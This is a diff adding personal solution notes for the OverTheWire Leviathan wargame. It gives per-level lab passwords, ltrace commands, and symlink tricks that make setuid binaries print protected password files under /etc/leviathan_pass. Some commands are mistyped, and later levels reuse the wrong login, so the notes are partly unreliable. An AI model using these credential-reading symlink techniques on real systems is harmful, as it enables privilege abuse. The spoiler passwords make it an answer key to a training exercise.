@@ -1,0 +1,85 @@
+Level0
+
+ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+pass: leviathan0
+ls -al
+cd .backup/
+ls -al
+cat bookmarks.html | grep leviathan1
+
+
+Level 1
+
+ssh leviathan1@leviathan.labs.overthewire.org -p 2223
+passs: 3QJ3TgzHDq
+la -al
+./check
+ltrace ./check
+./check
+pass: sex
+cat /etc/leviathan_pass/leviathan2
+
+Level2
+
+ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+pass: NsN1HwFoyN
+ls -al
+./printfile
+./printfile /etc/leviathan_pass/leviathan3
+mkdir /tmp/yash && touch /tmp/yash/test.txt
+ltrace ./printfile /tmp/yash/test.txt
+cd /tmp/yash/
+touch pass\ file.txt
+~/./printfile pass\ file.txt
+ln -s /etc/leviathan_pass/leviathan3 /tmp/yash/pass
+~/./printfile "pass file.txt"
+
+Level3 
+
+ssh leviathan3@leviathan.labs.overthewire.org -p 2223
+pass: f0n8h2iWLP
+ls -al
+./level3
+ltarce ./level3
+./level3
+pass: snlprintf
+
+Level4 
+
+ssh leviathan4@leviathan.labs.overthewire.org -p 2223
+pass: WG1egElCvO
+ls -al
+cd .trash
+ls
+./bin
+
+Level5
+
+ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+pass: 0dyxT7F4QD
+ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+ls -al
+./leviathan5
+ltarce ./leviathan5
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+
+Level6
+
+ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+pass:szo7HDB88w
+ls -al
+mkdir /tmp/joe/
+cd /tmp/joe
+nano brute.sh
+chmod +x brute.sh
+brute.sh
+whoami
+id
+cat /etc/leviathan_pass/leviathan7
+
+Level7
+
+ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+pass: qEs5Io5yM8
+ls -al
+cat CONGRATULATIONS
